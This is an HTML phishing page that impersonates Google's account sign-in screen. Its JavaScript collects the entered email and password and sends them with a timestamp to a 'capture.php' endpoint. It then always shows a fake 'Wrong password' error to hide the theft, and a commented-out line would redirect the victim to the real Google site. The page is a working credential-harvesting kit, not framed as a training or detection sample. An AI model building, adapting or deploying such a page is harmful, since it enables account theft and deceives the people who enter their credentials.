<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAA7AAAAOwBeShxvQAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAJMSURBVFiFxZdPaBNBFMa/N7ubTZpN0zZp" type="image/x-icon">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 450px;
        }
        .card {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            text-align: center;
        }
        .logo {
            margin-bottom: 16px;
        }
        .logo-text {
            font-size: 24px;
            color: #202124;
            margin-bottom: 8px;
        }
        .logo-img {
            width: 75px;
            height: 24px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 16px;
            color: #202124;
            margin-bottom: 24px;
        }
        .input-group {
            margin-bottom: 24px;
            text-align: left;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }
        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }
        .forgot-email {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            display: inline-block;
            margin-top: 8px;
            font-weight: 500;
        }
        .forgot-email:hover {
            text-decoration: underline;
        }
        .info-text {
            font-size: 12px;
            color: #5f6368;
            text-align: left;
            margin: 16px 0;
        }
        .button-group {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 24px;
        }
        .create-account {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }
        .create-account:hover {
            text-decoration: underline;
        }
        .next-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .next-btn:hover {
            background-color: #1765cc;
        }
        .next-btn:disabled {
            background-color: #dadce0;
            cursor: not-allowed;
        }
        .footer {
            display: flex;
            justify-content: space-between;
            margin-top: 40px;
            font-size: 12px;
            color: #5f6368;
        }
        .footer select {
            border: none;
            background: transparent;
            color: #5f6368;
            font-size: 12px;
            cursor: pointer;
        }
        .footer-links {
            display: flex;
            gap: 24px;
        }
        .footer-links a {
            color: #5f6368;
            text-decoration: none;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .error-message {
            display: none;
            color: #d93025;
            font-size: 12px;
            text-align: left;
            margin-top: 8px;
        }
        .password-step {
            display: none;
        }
        .email-display {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            margin-bottom: 24px;
            background-color: #f1f3f4;
        }
        .email-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: #1a73e8;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 20px;
            font-weight: 500;
        }
        .email-info {
            flex: 1;
            text-align: left;
        }
        .email-address {
            font-size: 14px;
            color: #202124;
        }
        .loading {
            display: none;
            margin: 20px auto;
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1a73e8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">

                    </g>
                </svg>
                <h1 id="page-title">Sign in</h1>
                <p class="subtitle">Use your Google Account</p>
            </div>

            <!-- Email Step -->
            <div id="email-step">
                <div class="input-group">
                    <input type="email" id="email" placeholder="Email or phone" autocomplete="email" required>
                    <div class="error-message" id="email-error">Enter a valid email or phone number</div>
                </div>
                <a href="#" class="forgot-email">Forgot email?</a>
                <p class="info-text">Not your computer? Use Guest mode to sign in privately.</p>
                <div class="button-group">
                    <a href="#" class="create-account">Create account</a>
                    <button class="next-btn" id="email-next">Next</button>
                </div>
            </div>

            <!-- Password Step -->
            <div id="password-step" class="password-step">
                <div class="email-display">
                    <div class="email-avatar" id="avatar">G</div>
                    <div class="email-info">
                        <div class="email-address" id="display-email"></div>
                    </div>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password" required>
                    <div class="error-message" id="password-error">Wrong password. Try again or click Forgot password</div>
                </div>
                <a href="#" class="forgot-email">Forgot password?</a>
                <div class="button-group">
                    <a href="#" class="create-account" id="back-btn">← Back</a>
                    <button class="next-btn" id="password-next">Next</button>
                </div>
            </div>

            <div class="loading" id="loading"></div>
        </div>

        <div class="footer">
            <select>
                <option>English (United States)</option>
                <option>اردو</option>
                <option>العربية</option>
            </select>
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script>
        const emailStep = document.getElementById('email-step');
        const passwordStep = document.getElementById('password-step');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const emailNext = document.getElementById('email-next');
        const passwordNext = document.getElementById('password-next');
        const backBtn = document.getElementById('back-btn');
        const displayEmail = document.getElementById('display-email');
        const avatar = document.getElementById('avatar');
        const emailError = document.getElementById('email-error');
        const passwordError = document.getElementById('password-error');
        const loading = document.getElementById('loading');

        let capturedEmail = '';

        // Email validation
        function isValidEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }

        // Email step
        emailNext.addEventListener('click', (e) => {
            e.preventDefault();
            const email = emailInput.value.trim();
            
            if (!email || !isValidEmail(email)) {
                emailError.style.display = 'block';
                emailInput.style.borderColor = '#d93025';
                return;
            }
            
            emailError.style.display = 'none';
            emailInput.style.borderColor = '#dadce0';
            capturedEmail = email;
            
            // Show password step
            emailStep.style.display = 'none';
            passwordStep.style.display = 'block';
            displayEmail.textContent = email;
            avatar.textContent = email.charAt(0).toUpperCase();
            document.getElementById('page-title').textContent = 'Welcome';
            passwordInput.focus();
        });

        // Password step
        passwordNext.addEventListener('click', async (e) => {
            e.preventDefault();
            const password = passwordInput.value.trim();
            
            if (!password) {
                passwordError.textContent = 'Enter a password';
                passwordError.style.display = 'block';
                passwordInput.style.borderColor = '#d93025';
                return;
            }
            
            // Show loading
            loading.style.display = 'block';
            passwordNext.disabled = true;
            
            // Send credentials to server
            try {
                const response = await fetch('capture.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        email: capturedEmail,
                        password: password,
                        timestamp: new Date().toISOString()
                    })
                });
                
                // Simulate loading
                setTimeout(() => {
                    // Show error message (realistic behavior)
                    loading.style.display = 'none';
                    passwordNext.disabled = false;
                    passwordError.style.display = 'block';
                    passwordInput.style.borderColor = '#d93025';
                    passwordInput.value = '';
                    
                    // Optionally redirect to real Gmail after capture
                    // window.location.href = 'https://accounts.google.com';
                }, 2000);
                
            } catch (error) {
                console.error('Error:', error);
            }
        });

        // Back button
        backBtn.addEventListener('click', (e) => {
            e.preventDefault();
            passwordStep.style.display = 'none';
            emailStep.style.display = 'block';
            document.getElementById('page-title').textContent = 'Sign in';
            passwordInput.value = '';
            passwordError.style.display = 'none';
        });

        // Enter key handling
        emailInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') emailNext.click();
        });

        passwordInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') passwordNext.click();
        });
    </script>


</body>
</html>
